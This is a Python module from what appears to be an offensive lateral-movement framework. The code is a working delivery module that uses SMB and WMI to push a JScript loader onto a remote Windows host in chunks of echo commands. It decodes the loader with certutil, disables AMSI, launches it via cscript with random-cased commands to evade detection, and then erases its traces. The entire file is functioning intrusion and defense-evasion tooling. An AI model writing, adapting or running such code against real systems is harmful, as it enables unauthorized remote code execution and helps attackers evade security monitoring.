# -*- coding: UTF-8 -*-

import logging
import os
import time

from tqdm import tqdm

from framework import utils
from framework.connector import init_smb_connection
from framework.connector import log_smb_info
from framework.helpers import WmiHelper
from framework.pokeball import BasePokeBall


class PokeBall(BasePokeBall):
    desc = "(User) WMI + echo + certutil.exe + cscript.exe (Vista+)"

    local_loader_path = None

    tree = None

    temp_name = None
    temp_path = None
    uploaded_temp = False

    loader_name = None
    loader_path = None
    uploaded_loader = False

    run_cscript = False
    is_win10 = True
    disabled_amsi = False

    def init(self):
        self.payload_path = os.path.join(self.opts["data"], "payload", "pikachu.bin")
        if not os.path.exists(self.payload_path):
            raise Exception("{} does not existed".format(self.payload_path))
        self.local_loader_path = os.path.join(self.opts["data"], "loader", "jscript.js")
        if not os.path.exists(self.local_loader_path):
            raise Exception("{} does not existed".format(self.local_loader_path))

        self.smb_conn = init_smb_connection(self.opts)
        log_smb_info(self.smb_conn)

        self.helper = WmiHelper(self.opts, self.smb_conn)
        self.helper.init()

    def delivery_loader(self):
        try:
            if self.smb_conn.getServerOSMajor() < 10:
                self.is_win10 = False
        except:
            pass

        self.tree = utils.get_random_location()
        self.temp_name = "{}.{}".format(utils.get_random_name(), utils.get_random_extension())
        self.loader_name = "{0}.{1}".format(utils.get_random_name(), utils.get_random_extension())

        temp_path = "{}\\{}".format(self.tree, self.temp_name)
        self.temp_path = temp_path
        loader_path = "{}\\{}".format(self.tree, self.loader_name)
        self.loader_path = loader_path

        with open(self.local_loader_path, 'rb') as f:
            content = f.read()
        content = content.replace('PIPE_NAME_IS_HERE', self.pipe_name)
        content = utils.get_auto_environment_js(self.opts) + content
        echos = utils.data_to_echo_commands(content, temp_path)

        progress_bar = None
        for command_echo in echos:
            self.helper.execute_command(command_echo)
            self.uploaded_temp = True
            time.sleep(0.2)

            if progress_bar is None:
                logging.info("Uploading temp file: {}".format(temp_path))
                progress_bar = tqdm(total=len(echos), ncols=80, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} commands")
            progress_bar.update(1)
        progress_bar.close()

        logging.info("Decoding to file: {}".format(loader_path))
        command_decode = utils.command_certutil_decode(temp_path, loader_path)
        self.helper.execute_command(command_decode)
        self.uploaded_loader = True

        if self.is_win10:
            try:
                command = utils.command_disable_amsi_script()
                self.helper.execute_command(command)
                logging.info("Disabled AMSI: {}".format(command))
                self.disabled_amsi = True
            except Exception as e:
                logging.error("Error in trying to disable AMSI: {}".format(e))

        command = '{0} "{1}"'.format(utils.random_case("start /B cscript //E:JScript"), self.loader_path)
        logging.info("Executing: {}".format(command))
        self.helper.execute_command(command)
        self.run_cscript = True
        time.sleep(2)

    def clean_up(self):
        if self.uploaded_temp:
            try:
                command = utils.command_delete_file(self.temp_path)
                self.helper.execute_command(command)
                logging.info("Deleted: {}".format(self.temp_path))
            except Exception as e:
                logging.error(e)

        if self.run_cscript:
            try:
                command = "wmic process where \"name='cscript.exe' " \
                          "and commandline like '%{}%'\" " \
                          "call terminate".format(self.loader_name)
                command = utils.random_case(command)
                self.helper.execute_command(command)
            except Exception as e:
                logging.error(e)

        if self.is_win10:
            if self.disabled_amsi:
                try:
                    command = utils.command_enable_amsi_script()
                    self.helper.execute_command(command)
                except Exception as e:
                    logging.error(e)

        if self.uploaded_loader:
            try:
                command = utils.command_delete_file(self.loader_path)
                self.helper.execute_command(command)
                logging.info("Deleted: {}".format(self.loader_path))
            except Exception as e:
                logging.error(e)

        self.helper.clean_up()
